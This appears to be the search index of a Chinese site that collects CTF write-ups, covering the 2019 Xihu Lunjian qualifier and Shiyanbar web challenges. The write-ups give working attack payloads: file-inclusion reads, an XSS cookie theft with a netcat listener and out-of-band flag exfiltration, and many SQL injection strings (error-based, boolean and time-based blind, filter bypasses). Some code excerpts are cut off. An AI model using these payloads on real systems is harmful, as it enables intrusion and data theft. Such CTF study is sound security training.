{"./":{"url":"./","title":"介绍","keywords":"","body":"站点介绍 宗旨： 本站致力于收集各类CTF题的Writeup，以方便各位师傅们进行学习。 站长： ID：YunenEmail: yunen@cqu.edu.cn 感谢： 在此鸣谢对本站点提供帮助的朋友们(Issue、捐助、分享wp等)。 说明： 本站所有文章均来源与网上搜索查询，如果您有更好的Writeup想分享，欢迎email我的邮箱，如果损害了您的利益，请尽快联系我，确保在24小时之内进行删除。 "},"types/":{"url":"types/","title":"按类型区分","keywords":"","body":"按类型区分 按照赛题区分 类型 数量 网上练习题 1 官方赛事题 1 "},"types/web.html":{"url":"types/web.html","title":"网上练习题","keywords":"","body":"网上练习题 按照添加时间倒序排序 添加时间 名称 2019-04-15 实验吧web部分 "},"types/comp.html":{"url":"types/comp.html","title":"官方赛事题","keywords":"","body":"官方赛事题 按照添加时间倒序排序 添加时间 名称 2019-04-15 2019西湖论剑预选赛 "},"years/":{"url":"years/","title":"按年份区分","keywords":"","body":"按年份区分 将WP按年份区分可让我们更好的去猜测出题人的命题思路。 时间 数量 2019-2020 1 2018-2019 0 2017-2018 0 2016-2017 0 2015-2016 0 ????-2015 1 "},"years/2020.html":{"url":"years/2020.html","title":"2019-2020","keywords":"","body":"2019-2020 2019-2020的CTF 添加时间 名称 2019-04-15 2019西湖论剑预选赛 "},"years/2019.html":{"url":"years/2019.html","title":"2018-2019","keywords":"","body":"2018-2019 2018-2019年的CTF 添加时间 名称 "},"years/2018.html":{"url":"years/2018.html","title":"2017-2018","keywords":"","body":"2017-2018 "},"years/2017.html":{"url":"years/2017.html","title":"2016-2017","keywords":"","body":"2016-2017 "},"years/2016.html":{"url":"years/2016.html","title":"2015-2016","keywords":"","body":"2015-2016 "},"years/2015.html":{"url":"years/2015.html","title":"????-2015","keywords":"","body":"????-2015 未知年份及2015年(包含)之前的CTF 添加时间 名称 2019-04-15 实验吧web部分 "},"difficult/":{"url":"difficult/","title":"按难度区分","keywords":"","body":"按难度区分 按照难度区分，更方便不同层次的师傅学习 难度 数量 较易 1 中等 1 较难 0 "},"difficult/easy.html":{"url":"difficult/easy.html","title":"相对简单","keywords":"","body":"相对简单 按照添加时间倒序排序 添加时间 名称 2019-04-15 实验吧web部分 "},"difficult/mid.html":{"url":"difficult/mid.html","title":"难度中等","keywords":"","body":"难度中等 按照添加时间倒序排序 添加时间 名称 2019-04-15 2019西湖论剑预选赛 "},"difficult/diff.html":{"url":"difficult/diff.html","title":"难度较大","keywords":"","body":"难度较大 "},"articals/all.html":{"url":"articals/all.html","title":"目前已收录","keywords":"","body":"目前已收录 时间按照新旧排序，欢迎提交好的Writeup 时间 名称 2019-04-15 2019西湖论剑预选赛 2019-04-15 实验吧web部分 "},"articals/xihulunjian2019.html":{"url":"articals/xihulunjian2019.html","title":"2019西湖论剑预选赛","keywords":"","body":"2019西湖论剑预选赛 题目类型： 类型 年份 难度 官方赛事题 2019 中 网上公开WP: https://mp.weixin.qq.com/s/rlSyABoulRKygPmwfcUuXA https://www.anquanke.com/post/id/176136/ https://www.jianshu.com/p/c14970447ddd https://blog.csdn.net/qq_41420747/article/details/89076214 题目下载： 链接: https://pan.baidu.com/s/1B9Coqdmh8wYnYo3eW3MOMg 提取码: bagw 本站备份WP： 感谢：冷逸、fIappy[暂时未联系到作者] Web 作者：冷逸 babyt3 题目地址：http://61.164.47.198:10000/ 打开地址，发现提示： include $_GET['file'] 目测为文件包含，尝试读index.php的源码， http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=index.php 还原后如下： 发现提示，其实右击查看源代码也可以看到.. base64解码后得到dir.php 读dir.php http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=dir.php 得知该文件可以列目录，尝试列目录 http://61.164.47.198:10000/dir.php?dir=/ 这样得到ffffflag_1s_Her4文件 使用file读取，得到flag http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=/ffffflag_1s_Her4 Breakout 题目地址：http://61.164.47.198:10001/ 打开后是一个登录界面，随意输入账号密码，即可登录进去，登录后界面如下： 第一个子页面可以留言评论,第二个子页面是将某个链接发送给管理员,管理员会携带cookie查看该页面,第三个子页面是执行命令和清除留言,尝试直接输入命令执行,提示说要有管理员权限才可以执行命令.到这里,很显然这是一个xss漏洞盗取管理员cookie然后登录管理员账号去执行命令. 使用如下payload绕过过滤 然后在report哪里提交 http://61.164.47.198:10001/main.php 有个验证码，爆破脚本如下 import hashlib def md5(key): m = hashlib.md5() m.update(key.encode('utf-8')) return m.hexdigest() for i in range(1000000000): if md5(str(i))[0:6] == ' b0f446 ': print(i) break 自己服务器监听 nc -lvvp 8000 可得到cookie 然后执行命令，使用ceye外带flag 猜猜flag是什么 题目地址： http://61.164.47.198:10002/ dir扫描得到 发现.DS_Store 泄露 脱下来 发现e10adc3949ba59abbe56e057f20f883e目录 继续扫描，发现git文件 使用Githack下载后得到三个文件 BackupForMySite.zip index.php lengzhu.jpg 用明文攻击解开压缩包BackupForMySite.zip，得到里面的code 注：只能使用bindzip进行压缩，反正我7-zip压缩的失败 或者使用rbkcrack进行明文攻击 解开后得到code is 后面是一个随机串 带入首页得到一串数字 然后使用使用php_mt_seed：你的数字 然后访问/flag/得到的数字.txt 得到flag 二.Crypto： 作者：fIappy [暂时未联系到作者] 题目: 哈夫曼之谜题目链接:https://xpro-adl.91ctf.com/userdownload?filename=1904055ca752d3c1f20.zip&type=attach&feature=custom题目描述:打开压缩包后得到一个文本文件,内容如下 11000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110 a:4 d:9 g:1 f:5 l:1 0:7 5:9 {:1 }:1 根据题目名哈夫曼之谜,很容易想到是哈夫曼编码与解码的问题题目分析:对于哈夫曼编码的介绍就不多说,每个计算机专业的同学应该上数据结构课都学过,具体可以参考百度科:https://baike.baidu.com/item/%E5%93%88%E5%A4%AB%E6%9B%BC%E7%BC%96%E7%A0%81/1719730?fr=aladdin 对于这个题目,第一行的01串显然就是flag编码后的结果,被编码的元素是左边一列的字母,他们对应的权重在第二列,对于一个哈夫曼编码问题,首先需要根据元素的权重构建哈夫曼树,然后对要编码的字符串按照一定的算法进行编码,然后再按照一定的算法进行解码.这些算法我们不需要知道详细过程,做题时可完全没有必要自己实现一个哈夫曼编码,太费时间,所以我们可以参考网上实例代码进行修改即可 参考的哈夫曼编码代码的博客地址:https://blog.csdn.net/qq_40328281/article/details/80412359 代码分析:要修改的地方其实就是最大的编码长度maxn,text长度n,权重数据weight和text数组. #include \"pch.h\" #include const int maxvalue = 200; const int maxbit = 200; const int maxn = 200; #include \"stdio.h\" #include \"stdlib.h\" using namespace std; struct haffnode { char ch; int weight; int flag; int parent; int leftchild; int rightchild; }; struct code { int bit[maxn]; int start; int weight; char ch; }; void haffman(int weight[], char text[], int n, haffnode hafftree[]) { int j, m1, m2, x1, x2, i; for (i = 0; i 运行结果: 三.re 作者：fIappy [暂时未联系到作者] 1.junk_instruction 题目文件:https://xpro-adl.91ctf.com/userdownload?filename=1904055ca752e532f14.zip&type=attach&feature=custom 从题目名字看出,这是一个含有垃圾指令例如花指令的程序. 而且从文件图标来看,显然是一个mfc写的程序. 打开程序发现需要输入flag,然后点击check来检测是否正确.可以猜测是将我们的输入进行各种加密处理然后和程序中的某个字符串(可能是动态生成的)比较,得出是否输入正确. 通过xspy工具:https://github.com/lynnux/xspy/tree/master/xspydll 找到check按钮的处理函数: 查看该函数 从这个check函数的逻辑看,应该是402600对输入进行判断,下面2个if分支对应于输入正确和错误的弹窗.跟进402600,发现该函数后面又几段花指令,例如这个: call %+5直到下面的retn都是花指令,找到这几段类似的代码,全部nop掉即可. 然后f5反编译: v2 = (const WCHAR *)sub_401570(&a1); v17 = (void *)sub_4030A0(v2); v13 = v17; LOBYTE(v70) = 1; v3 = (void *)sub_401570(v17); sub_403000((int)&v60, v3); LOBYTE(v70) = 3; sub_4012A0(&v18); v19 = (char *)unknown_libname_1(&v60); v54 = v19; v16 = v19 + 1; v54 += strlen(v54); v14 = ++v54 - (v19 + 1); v12 = v54 - (v19 + 1); v68 = 0; memset(&v69, 0, 0x27u); strncpy(&v68, v19, v54 - (v19 + 1)); if ( sub_402AF0(&v68) ) // 判断输入长度 { v57 = 0; v59 = 0; LABEL_7: v58 = v59; } else { v63 = 1919252337;//这里是rc4密钥 v64 = 1769306484; v65 = 28783; v66 = 0; memset(&v67, 0, 0xF5u); v61 = 0; memset(&v62, 0, 0xFFu); v7 = 0; memset(&v8, 0, 0x1FFu); v53 = (const char *)&v63; v10 = (int *)((char *)&v63 + 1); v53 += strlen(v53); v9 = ++v53 - ((const char *)&v63 + 1); v6 = v53 - ((const char *)&v63 + 1); v5 = &v63; sub_402CA0(&v61); v56 = &v68; v15 = &v69; v56 += strlen(v56); v11 = ++v56 - &v69; sub_402E80(v20, &v61, &v68, v56 - &v69); for ( i = 31; i >= 0; --i ) { if ( *(&v68 + i) != *((char *)&savedregs + i + (_DWORD)&loc_4026B7 - 4204867) ) { v59 = 0; goto LABEL_7; } } v58 = 1; } LOBYTE(v70) = 0; sub_403060((int)&v60); v70 = -1; sub_4012A0(&a1); return v58; } 通过分析程序先将输入进行了逆序,再使用rc4加密. rc4数组初始化:该函数也是被花指令的,使用相同方法处理即可 void __cdecl sub_402CA0(_BYTE *a1, int a2, unsigned int a3) { char v3; // ST1B_1 int v4; // [esp+8h] [ebp-114h] signed int i; // [esp+10h] [ebp-10Ch] signed int j; // [esp+10h] [ebp-10Ch] char v7; // [esp+18h] [ebp-104h] char v8; // [esp+19h] [ebp-103h] v4 = 0; v7 = 0; memset(&v8, 0, 0xFFu); for ( i = 0; i 进行比较判断 加密函数:该函数也是被花指令的,使用相同方法处理即可 int __stdcall sub_402E80(int a1, int a2, unsigned int a3) { int result; // eax char v4; // ST1B_1 int v5; // [esp+Ch] [ebp-18h] unsigned int i; // [esp+10h] [ebp-14h] int v7; // [esp+14h] [ebp-10h] v7 = 0; v5 = 0; for ( i = 0; i 而check函数的这段正是用于比较的数组 最种解密如下: import base64 key = \"qwertyuiop\" res = [0xfa,0x45,0xd0,0x9e,0,0xc,0x9f,0x82,0x57,0x89,0xe5,0xf7,0xb0,0x64,0x76 ,0xdd,0xaf,0xff,0x7d,0x91,0x16,0xcb,0x3e,0x6e,0x7e,0x19,0xdd,0xc8,0x26,0xd0,0xd6,0x5b] res = res[::-1] tmp = \"\" for i in res: tmp += chr(i) tmp = base64.b64encode(tmp) print tmp ff = \"f250e3d75820847d427f3af11a783379\" flag = ['*']*32 for i in range(16): flag[i] = ff[31-i] flag[31-i] = ff[i] print \"flag{%s\"%(\"\".join(flag))+'}' W9bQJsjdGX5uPssWkX3/r912ZLD35YlXgp8MAJ7QRfo= flag{973387a11fa3f724d74802857d3e052f} 2.Testre 题目文件链接: https://xproadl.91ctf.com/userdownload?filename=1904055ca752e746df2.zip&type =attach&feature=custom ida打开文件,main函数如下 __int64 __fastcall main(__int64 a1, char **a2, char **a3) { void *ptr; // ST10_8 __int64 v5; // [rsp+18h] [rbp-28h] char v6; // [rsp+20h] [rbp-20h] int v7; // [rsp+3Ch] [rbp-4h] v7 = 0; v5 = 256LL; sub_400D00((__int64)&v6, 0x11uLL); ptr = malloc(0x100uLL); sub_400700(ptr, &v5, (__int64)&v6, 0x10uLL); free(ptr); return 0LL; } 跟进sub_400D00,发现是个接受输入的函数 跟进sub_400700: for ( i = 0LL; i 这部分将一个字符串和输入进行了异或加密,但后面会发现,并没有用到 while ( v20 >= 6; v21 /= 58; v27 /= v9; if ( !j ) break; } ++v20; v18 = j; } 这个循环才是主菜,我们暂时不去详细分析算法过程,比较复杂,但是可以看到常量58,被模了一下和被除了一下.继续看下面 if ( *v30 > n + v17 - j ) { if ( v17 ) // 不会执行到这里面,又是干扰分析 { c = 61; memset(encode_input, '1', v17); memset(v26, c, v17); } v20 = v17; while ( j 到这里发现有2个数组,分别是 .rodata:0000000000400EB0 byte_400EB0 db '1' ; DATA XREF: sub_400700+446↑r .rodata:0000000000400EB1 a23456789abcdef db '23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',0 .rodata:0000000000400EEB align 10h .rodata:0000000000400EF0 ; char byte_400EF0[] .rodata:0000000000400EF0 byte_400EF0 db 'A' ; DATA XREF: sub_400700+464↑r .rodata:0000000000400EF1 aBcdefghijklmno db 'BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',0 显然一个是base64编码表,一个是base58编码表,最开始把base58编码表看成了是数字加所有字母,浪费大量时间分析. 仔细观察代码,其实进行base64编码的过程是针对v26,但是v26变量指向的内存完全没有和最后的比较产生关系,所以这都是干扰做题的 最后观察比较语句,提取出最终串:D9cS9N9iHjMLTdA8YSMRMp 对其进行base58解码就是flag: import base58 as bs bs.b58decode('D9cS9N9iHjMLTdA8YSMRMp') #output: base58_is_boring base58通过pip install base58即可安装 3.easyCpp 题目链接： https://xproadl.91ctf.com/userdownload?filename=1904055ca752e6ae1c5.zip&type =attach&feature=custom 这个要求对 c++的 stl 比较熟悉 直接来到main: for ( i = 0; i >::push_back(&our_input, &v25[4 * i]); } for ( j = 0; j >::push_back(&fib_list, &input_begin); } 接受输入和生成斐波那契数列 std::vector>::push_back(&v20, v25); v7 = std::back_inserter>>(&v20); input_end = std::vector>::end(&our_input); input_begin = std::vector>::begin(&our_input); v9 = __gnu_cxx::__normal_iterator>>::operator+(&input_begin, 1LL);// 对input每个元素加1 std::transform>>,std::back_insert_iterator>>,main::{lambda(int)#1}>( v9, input_end, v7, v25); std::vector>::vector(&v23, input_end, v10); std::vector>::end(&v20); std::vector>::begin(&v20); std::accumulate>>,std::vector>,main::{lambda(std::vector>,int)#2}>((unsigned __int64)&input_begin); std::vector>::operator=(&v21, &input_begin); std::vector>::~vector(&input_begin); std::vector>::~vector(&v23); if ( (unsigned __int8)std::operator!=>(&v21, &fib_list) )// 必须相同 { puts(\"You failed!\"); exit(0); } transform是把v9的每个元素通过匿名函数进行转换,结果存入v20 进入transform: v4 = (int *)__gnu_cxx::__normal_iterator>>::operator*(&input_begin_1); v11 = main::{lambda(int)#1}::operator() const((_DWORD **)&v29, *v4);// 把输入的vector和v29相加 v5 = std::back_insert_iterator>>::operator*(&v24_backinsert); std::back_insert_iterator>>::operator=(v5, &v11); __gnu_cxx::__normal_iterator>>::operator++(&input_begin_1); std::back_insert_iterator>>::operator++(&v24_backinsert); 再进入 main::{lambda(int)#1}::operator() const((_DWORD *)&v29, v4);: __int64 __fastcall main::{lambda(int)#1}::operator() const(_DWORD **a1, int a2) { return (unsigned int)(**a1 + a2); } 这下就知道这个就是把输入和输入的第一个元素相加 接着看std::accumulate,这个程序的std::accumulate和c++的不一样不知道是不是ida识别错误,打开看这个函数,内部还是有个匿名函数,静态分析比较复杂,我们通过动态调试来分析 根据 std::vector>::operator=(&v25, &input_begin); std::vector>::~vector(&input_begin); std::vector>::~vector(&v27); if ( (unsigned __int8)std::operator!=>(&v25, &fib_list) )// 必须相同 我们需要分析v25的内容,通过下断std::vector>::~vector(&input_begin);再查看v25: gef➤ x/10gx $rsp+0x90 0x7fffc6f61660: 0x0000000002007f10 0x0000000002007f50 0x7fffc6f61670: 0x0000000002007f50 0x0000000000000000 0x7fffc6f61680: 0x0000000000000000 0x0000000000000000 0x7fffc6f61690: 0x0000000000000000 0x0000000000000000 0x7fffc6f616a0: 0x0000000000000000 0x0000000000000000 地址为0x0000000002007f10, 再查看堆: …….] Chunk(addr=0x2007e30, size=0x50, flags=PREV_INUSE) [0x0000000002007e30 00 00 00 00 00 00 00 00 24 00 00 00 23 00 00 00 ……..$…#…] Chunk(addr=0x2007e80, size=0x50, flags=PREV_INUSE) [0x0000000002007e80 20 7e 00 02 00 00 00 00 24 00 00 00 23 00 00 00 ~……$…#…] Chunk(addr=0x2007ed0, size=0x40, flags=PREV_INUSE) [0x0000000002007ed0 00 00 00 00 00 00 00 00 23 00 00 00 22 00 00 00 ……..#…”…] Chunk(addr=0x2007f10, size=0x50, flags=PREV_INUSE) [0x0000000002007f10 27 00 00 00 26 00 00 00 25 00 00 00 24 00 00 00 gef➤ x/16wx 0x0000000002007f10 0x2007f10: 0x00000027 0x00000026 0x00000025 0x00000024 0x2007f20: 0x00000023 0x00000022 0x00000021 0x00000020 0x2007f30: 0x0000001f 0x0000001e 0x0000001d 0x0000001c 0x2007f40: 0x0000001b 0x0000001a 0x00000019 0x0000000c 发现这个是把输入进行了反向. 总结一下加密流程 1.接受16个数字输入 2.计算斐波那契数列前16项 3.把16个数字输入从第二个元素开始,都加上第一个元素 4.将3的结果反向 5.将4的结果和2的结果比较,完全相同则输入的是flag 解密脚本: a = [1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987] c = a[::-1] d = [987] for i in range(1,len(c)): d.append(c[i]-987) import pprint pprint.pprint(d) 输出: [987, -377, -610, -754, -843, -898, -932, -953, -966, -974, -979, -982, -984, -985, -986, -986] getflag: from pwn import * p = process('./easyCpp') input_ = [987, -377, -610, -754, -843, -898, -932, -953, -966, -974, -979, -982, -984, -985, -986, -986] for i in input_: p.sendline(str(i)) p.interactive() "},"articals/shiyanbar_web.html":{"url":"articals/shiyanbar_web.html","title":"实验吧web部分","keywords":"","body":"实验吧Web部分 题目类型： 类型 年份 难度 网上练习题 无 易 网上公开WP： https://www.cnblogs.com/sch01ar/p/7996159.html https://www.0x002.com/2019/百道CTF刷题记录(一)/ 本站备份WP: 作者：Yunen 简介 最近在刷CTF题，主攻Web，兼职Misc Shiyanbar 0x01 简单的登陆题 简单概括： 考点： %00截断正则 CBC字节翻转攻击 难度： 难 WP：https://blog.csdn.net/include_heqile/article/details/79942993 解题过程： F12查看响应头，发现返回tips访问test.php文件得到源代码： base64_decode('\".base64_encode($plain).\"') can't unserialize\"); $sql=\"select * from users limit \".$info['id'].\",0\"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)>0 or die(mysqli_error($link))){ $rows=mysqli_fetch_array($result); echo 'Hello!'.$rows['username'].''; } else{ echo 'Hello!'; } }else{ die(\"ERROR!\"); } } } if(isset($_POST['id'])){ $id = (string)$_POST['id']; if(sqliCheck($id)) die(\"sql inject detected!\"); $info = array('id'=>$id); login($info); echo 'Hello!'; }else{ if(isset($_COOKIE[\"iv\"])&&isset($_COOKIE['cipher'])){ show_homepage(); }else{ echo ' Login Form input id to login '; } }?> 代码分析： sqliCheck函数负责过滤sql注入 get_random_iv 生成16位随机数(Asicc范围在0~255内)iv 漏洞原因：aes-128-cbc加密存在CBC翻转攻击(不理解，暂时跳过) 0x02 后台登录 简单概括： 考点：md5()函数16位二进制格式绕过，md5(\"ffifdyop\",True)得到的加密字符串为'or'6(注：or '数字+字母' 等价于or true) 难度：易 WP：https://blog.csdn.net/qq_36791003/article/details/81746730 解题过程： 打开网页，右键查看源代码发现源码： 0){ echo 'flag is :'.$flag; } else{ echo '密码错误!'; } --> 上网查了下，了解到md5($password,true)返回的是原始 16 字符二进制格式的密文,返回的内容可以存在单引号，故我们可以找个字符串，使其md5(str,true)加密过返回的字符串与原sql语句拼接造成SQL注入攻击。经过简单的Fuzz,我们知道：字符串'or'6\"，此时如果拼接到sql语句中，那么这条语句将会变成一条永真式，因此成功登录，获得flag。 0x03 加了料的报错注入 简单概括： 考点：双参数注释绕过，=被过滤可用regexp 'xxx'和in (0xaaaa)代替 难度： 中 WP：https://www.jianshu.com/p/95f18a32ec7b 解题过程： 观察题目可知此题考的是报错注入，右键源代码得到提升：Post发送username&password。sql语句如下： $sql=\"select * from users where username='$username' and password='$password'\"; 注意：此处可控的参数有两个。简单手工测试，发现过滤了#，and等关键字，而且username处单独过滤了右括号，这意味着我们无法再username出使用函数，因而我们将目光转向password。经过一番人工Fuzz，发现只有exp()函数没有被过滤，故我们构造语句：exp(~(select * from(select user())a))成功爆出用户名。 最终我们的payload如下： username=a'/*&password=*/Or exp(~(select * from(select database())a))or'1 //查询当前数据库 username=a'/*&password=*/Or exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema regexp 'error_based_hpf')a))or'1 //查询表名，此处由于=被过滤，我们使用regexp来绕过 username=a'/*&password=*/Or exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj')a))or'1 //查询列名，此处由于and被过滤，故而不加数据库名的验证，在实际渗透中最好还是尽量加上。 username=a'/*&password=*/Or exp(~(select * from(select group_concat(value) from ffll44jj)a))or'1 //获取flag 0x04 认真一点！ 简单概括： 考点：双层叠加绕过过滤，大小写绕过，from()for()代替偏移，布尔盲注 难度：难 WP：https://blog.csdn.net/xingyyn78/article/details/79747404 解题过程： 打开网页，随便输入个数字，页面返回You are in...，输入在数字后加单引号，返回You are not in...。猜测此处考的是bool盲注，根据页面返回的内容判断真假。经过一番简单的fuzz，发现此处过滤的函数只会过滤一次，那么我们可以将过滤关键词双写：oorr就好了。 id=aaa'oorr(1=1)='1 //返回You are in id=aaa'oorr(1=2)='1 //返回You are not in // 此处的aaa是为了让前边条件为假，那么sql语句的判断将依赖于后边的语句 // 即：false ∪ (条件一) = 条件一 我们先判断数据库长度： id=aaa'oorr(length(database())>1)='1 其次循环取数据库名进行判断： id=aaa'oorr(mid((select+database())from(1)foorr(1))='c')='1 //由于,被过滤，使用from与for进行绕过，记得for要写成foorr绕过过滤，+号绕过空格过滤 接着循环判断表名： id=aaa'oorr(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))from(1)foorr(1))='a')='1 之后就不写了，与上边类似，写脚本跑就好。 0x05 你真的会PHP吗？ 简单概括： 考点：is_numeric函数的绕过(%20|%00)、PHP32位系统整数型变量最大值为：2147483647(2^31-1) 64位：9223372036854775807(2^63-1) 难度：中 WP：https://blog.csdn.net/JBlock/article/details/78745513 解题过程： 打开题目，发现返回头存在提示信息：打开链接获得源码： $value) { $value = trim($value); is_string($value) && $req[$key] = addslashes($value); } } function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i 代码流程：is_numeric[false] && $req['number']!=strval(intval($req['number']))[false]-> $value1!=$value2[false]-> is_palindrome_number($req[\"number\"])[true] 我们知道is_numeric函数与ereg函数一样，存在截断漏洞，而第二个if判断存在弱类型比较的漏洞，我们将这两个漏洞组合起来打一套组合拳。PHP语言对于32位系统的int变量来说，最大值是2147483647，如果我们传入的数值为2147483647的话，经过strrev函数反转再转成int函数仍是2147483647，因为746384741>2147483647，转成int变量会减小成2147483647，故而绕过看似矛盾的条件。而对于开始的is_numeric，加上%00或%20即可，此时is_numeric函数便不会认为这是个数字，而对于下边的strval()in、intval()却无影响。综上所述，我们的number应为：2147483647%00、2147483647%20、%002147483647。 此处%20不能再开头的原因是intval()会将其转换成数字0，而%00无影响。 0x06 登陆一下好吗?? 简单概括： 考点：登录框万能密码 难度：中 WP：https://blog.csdn.net/h1012946585/article/details/79851884 解题过程： 打开页面，猜测考的是万能密码，手动Fuzz发现过滤了or，故改用'='成功。 0x07 who are you? 简单概括： 考点：时间盲注，and case when () then () else () end绕过逗号过滤。 难度：中 WP：https://blog.csdn.net/wy_97/article/details/75643252 解题过程： 抓包，发现回显的数据貌似是直接取header的值，没有经过数据库，使用报错注入失败，猜测是盲注，由于bool盲注返回的页面一致，故此题应为时间盲注：简单测试发现逗号被过滤，导致我们无法使用if语句，不过我们可以换成case when then else语句代替： X-Forwarded-For: 127.0.0.1'and case when(length(database())>1)then(sleep(5))else(sleep(0))end and '1 剩下的就是写脚本慢慢跑了，此处略过。 0x08 因缺思汀的绕过 简单概括： 考点：gourp by xxx with rollup limit 1 offset x#【创建虚拟表最后一行为pwd的值为NULL，借用offset偏移到最后一个，post传输空的pwd，满足条件】 难度：中 WP：https://blog.csdn.net/qq_35078631/article/details/54772798 解题过程： 右键源代码得到提示信息source.txt，打开得到源码。 '.\"\"; echo ''.\"\"; echo ''.\"\"; echo ''.\"\"; echo ''.\"\"; echo ''.\"\"; die; } function AttackFilter($StrKey,$StrValue,$ArrReq){ if (is_array($StrValue)){ $StrValue=implode($StrValue); } if (preg_match(\"/\".$ArrReq.\"/is\",$StrValue)==1){ print \"水可载舟，亦可赛艇！\"; exit(); } } $filter = \"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\"; foreach($_POST as $key=>$value){ AttackFilter($key,$value,$filter); } $con = mysql_connect(\"XXXXXX\",\"XXXXXX\",\"XXXXXX\"); if (!$con){ die('Could not connect: ' . mysql_error()); } $db=\"XXXXXX\"; mysql_select_db($db, $con); $sql=\"SELECT * FROM interest WHERE uname = '{$_POST['uname']}'\"; $query = mysql_query($sql); if (mysql_num_rows($query) == 1) { $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) { print \"CTF{XXXXXX}\"; }else{ print \"亦可赛艇！\"; } }else{ print \"一颗赛艇！\"; } mysql_close($con); ?> 阅读源码可知，我们需要让数据库返回的pwd字段与我们post的内容相同，注意此处是弱类型比较。我们知道grou by with roolup 将创建个虚拟表，且表的最后一行pwd字段为Null。 mysql> create table test ( -> user varchar(100) not null, -> pwd varchar(100) not null);mysql>insert into test values(\"admin\",\"mypass\");mysql>select from test group by pwd with rollupmysql> select from test group by pwd with rollup;+-------+------------+| user | pwd |+-------+------------+| guest | alsomypass || admin | mypass || admin | NULL |+-------+------------+3 rows in setmysql> select from test group by pwd with rollup limit 1;+-------+------------+| user | pwd |+-------+------------+| guest | alsomypass |+-------+------------+mysql> select from test group by pwd with rollup limit 1 offset 0;+-------+------------+| user | pwd |+-------+------------+| guest | alsomypass |+-------+------------+1 row in setmysql> select from test group by pwd with rollup limit 1 offset 1;+-------+--------+| user | pwd |+-------+--------+| admin | mypass |+-------+--------+1 row in setmysql> select from test group by pwd with rollup limit 1 offset 2;+-------+------+| user | pwd |+-------+------+| admin | NULL |+-------+------+1 row in set 构造payload:uname=1' or true group by pwd with rollup limit 1 offset 2#&pwd=offset 2为偏移两个数据，即第三行的pwd字段为空。 0x09 简单的sql注入之3 简单概括： 考点：mysql报错注入 难度：易 WP：https://www.cnblogs.com/caizhiren/p/7846917.html 解题过程： exp函数报错一把嗦 0x0A 简单的sql注入之2 简单概括： 考点：空格过滤 难度：易 WP：https://www.cnblogs.com/caizhiren/p/7862466.html 解题过程： 简单Fuzz发现过滤了空格，使用内敛注释一把嗦。 /**/select/**/group_concat(table_name)/**/from/**/information_schema.tables=database() 0x0B 简单的sql注入之1 简单概括： 考点：双层叠加绕过 难度：易 WP：https://www.jianshu.com/p/5d37d33854e3 解题过程 selectselect 0x0C 天下武功唯快不破 简单概括： 考点：脚本工具的编写 难度：易 WP：无 解题过程： import requests,base64 r = requests.get('http://ctf5.shiyanbar.com/web/10/10.php') key=base64.b64decode(r.headers['FLAG'])[-9:] r = requests.post('http://ctf5.shiyanbar.com/web/10/10.php',data={'key':key}) print(r.text) 0x0D 让我进去 简单概括： 考点：hash长度拓展攻击 难度：难 WP：http://www.0x002.com/2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/ 0x0E 拐弯抹角 简单概括： 考点：index.php/index.php 难度：易 WP：无 解题过程： index.php/index.php 0X0F Forms 简单概括： 考点：不清楚，过于简单 难度：无 WP：无 0x10 天网管理系统 简单概括： 考点：PHP==弱类型比较，PHP序列化与反序列化 难度：易 WP：http://www.cnblogs.com/ssooking/p/5877086.html 解题过程： 右键查看源代码发现部分源码 ：我们知道0e开头的字符串在与数字0做弱类型比较时会先转成数值0在比较，故：我们只要输入一个经md5加密后密文为0e开头的字符串即可。 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 0x11 忘记密码了 简单概括： 考点：vim源码泄露 难度：中 WP：.submit.php.swp 解题过程： 打开题目，观察源码，发现管理员邮箱：admin@simplexue.com，随便输入一个内容提交，显示step2.php，尝试访问step2.php，网页被重定向且返回html源码，发现存在submit.php文件，猜测存在swp源码泄露，访问.submit.php.swp文件得到部分源码。 ........这一行是省略的代码........ /* 如果登录邮箱地址不是管理员则 die() 数据库结构 -- -- 表的结构 `user` -- CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT '0', PRIMARY KEY (`id`) ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ; -- -- 